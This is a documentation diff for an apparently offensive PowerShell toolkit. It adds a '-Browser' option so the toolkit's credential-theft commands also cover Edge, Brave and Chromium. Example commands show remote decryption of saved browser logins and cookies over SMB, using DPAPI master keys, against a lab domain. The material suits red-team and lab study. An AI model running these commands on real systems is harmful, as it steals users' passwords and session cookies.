@@ -609,6 +609,7 @@ Reads Chrome's Login Data SQLite database for user profiles over SMB and decrypt
 Modern Chrome (v10/v11) uses an AES state key stored in `Local State` (`os_crypt.encrypted_key`), which is DPAPI-protected with user scope.
 To avoid remote SQLite locking issues, TBO snapshots the database (and optional `-wal`/`-shm` sidecars when present) to a local temp directory before querying.
 Use `-AllProfiles` to enumerate profile folders under `User Data` (Default, Profile *, Guest Profile, System Profile). When `-AllProfiles` is set, `-ProfileName` is ignored.
+Use `-Browser` to target other Chromium browsers (`Edge`, `Brave`, `Chromium`). Default is `Chrome`.
 
 ```powershell
 $userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
@@ -616,6 +617,9 @@ Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys 
 
 Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -AllProfiles -MasterKeys $userKeys
 Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -ProfileName 'Profile 2' -MasterKeys $userKeys
+
+# Edge (Chromium)
+Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -Browser Edge -AllProfiles -MasterKeys $userKeys
 ```
 
 #### Get-TBOChromeCookies
@@ -623,6 +627,7 @@ Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'j
 Reads Chrome's Cookies SQLite database for user profiles over SMB and decrypts cookie values.
 Prefers `Network\\Cookies` (newer Chrome path) and falls back to legacy `Cookies` when needed.
 Use `-AllProfiles` to enumerate profile folders under `User Data` (Default, Profile *, Guest Profile, System Profile). When `-AllProfiles` is set, `-ProfileName` is ignored.
+Use `-Browser` to target other Chromium browsers (`Edge`, `Brave`, `Chromium`). Default is `Chrome`.
 
 ```powershell
 $userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
@@ -631,6 +636,9 @@ Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys
 Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -AllProfiles -MasterKeys $userKeys
 Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys |
   Select-Object HostKey, Name, Value, ExpiresUtc
+
+# Edge (Chromium)
+Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -Browser Edge -AllProfiles -MasterKeys $userKeys
 ```
 
 #### Get-TBOSafariKeychain
